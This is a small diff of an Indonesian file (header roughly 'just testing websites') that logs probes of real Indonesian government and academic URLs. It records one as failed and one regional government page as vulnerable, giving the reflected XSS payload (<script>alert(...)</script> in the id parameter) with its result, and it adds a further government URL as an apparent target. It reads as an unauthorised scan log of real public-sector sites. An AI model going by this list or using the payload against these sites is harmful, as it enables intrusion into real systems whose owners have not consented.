@@ -3,3 +3,4 @@ CUMAN NGETES WEB DOANG ;)
 https://bp2tl.ac.id/pengumuman_detail.php?id=4 [GAGAL]
 
 https://bkd.mesujikab.go.id/web/blog/blog_detail/sub_berita.php?id=<script>alert("Seorang Pentester tahu bahwa setiap sistem memiliki celah. Tetapi yang lebih penting, mereka tahu bagaimana memperbaikinya, bukan hanya mengeksploitasinya.\n\nfixploit03");</script> [Reflected XSS]
+https://pkmbandung.tulungagung.go.id/berita_webdisplay.php?id=2
